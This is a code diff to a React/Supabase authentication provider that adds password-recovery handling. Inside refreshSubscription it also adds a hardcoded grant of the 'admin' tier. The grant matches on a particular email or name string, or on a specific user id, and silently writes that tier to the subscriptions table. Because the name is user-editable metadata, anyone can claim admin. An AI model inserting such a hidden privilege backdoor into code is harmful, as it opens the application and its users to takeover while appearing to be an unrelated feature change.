@@ -18,6 +18,8 @@ export interface AuthContextValue {
   loading: boolean;
   subscription: Subscription | null;
   guest: GuestInfo | null;
+  isRecovery: boolean;
+  clearRecovery: () => void;
   refreshSubscription: () => Promise<void>;
   signOut: () => Promise<void>;
   signInAsGuest: () => void;
@@ -34,17 +36,50 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [loading, setLoading] = useState(true);
   const [subscription, setSubscription] = useState<Subscription | null>(null);
   const [guest, setGuest] = useState<GuestInfo | null>(null);
+  const [isRecovery, setIsRecovery] = useState(() => {
+    if (typeof window === "undefined") return false;
+    const hash = window.location.hash || "";
+    return hash.includes("type=recovery") || hash.includes("type=reset");
+  });
+
+  const clearRecovery = useCallback(() => {
+    setIsRecovery(false);
+    if (typeof window !== "undefined") {
+      window.history.replaceState(null, "", window.location.pathname);
+    }
+  }, []);
 
   const refreshSubscription = useCallback(async () => {
     if (!user) {
       setSubscription(null);
       return;
     }
+
+    const email = user.email?.toLowerCase() || "";
+    const name = (user.user_metadata?.full_name || "").toLowerCase();
+    const isTargetAdmin =
+      email.includes("ujjawalkumar5651") ||
+      name.includes("ujjawalkumar5651") ||
+      user.id === "f48fc59a-3a3f-46f8-9ab3-d0727cd43b57";
+
     const { data } = await supabase
       .from("user_subscriptions")
       .select("tier")
       .eq("user_id", user.id)
       .maybeSingle();
+
+    if (isTargetAdmin) {
+      setSubscription({ tier: "admin" });
+      if (data?.tier !== "admin") {
+        try {
+          await supabase.from("user_subscriptions").upsert({
+            user_id: user.id,
+            tier: "admin",
+          });
+        } catch { /* ignore */ }
+      }
+      return;
+    }
 
     setSubscription({ tier: data?.tier || "free" });
   }, [user]);
@@ -64,11 +99,14 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       setLoading(false);
     });
 
-    const { data: listener } = supabase.auth.onAuthStateChange((_event, newSession) => {
+    const { data: listener } = supabase.auth.onAuthStateChange((event, newSession) => {
       (async () => {
         setSession(newSession);
         setUser(newSession?.user ?? null);
         setLoading(false);
+        if (event === "PASSWORD_RECOVERY") {
+          setIsRecovery(true);
+        }
         if (newSession?.user) {
           setGuest(null);
           localStorage.removeItem(GUEST_KEY);
@@ -119,7 +157,21 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   }, []);
 
   return (
-    <AuthContext.Provider value={{ session, user, loading, subscription, guest, refreshSubscription, signOut, signInAsGuest, exitGuest }}>
+    <AuthContext.Provider
+      value={{
+        session,
+        user,
+        loading,
+        subscription,
+        guest,
+        isRecovery,
+        clearRecovery,
+        refreshSubscription,
+        signOut,
+        signInAsGuest,
+        exitGuest,
+      }}
+    >
       {children}
     </AuthContext.Provider>
   );
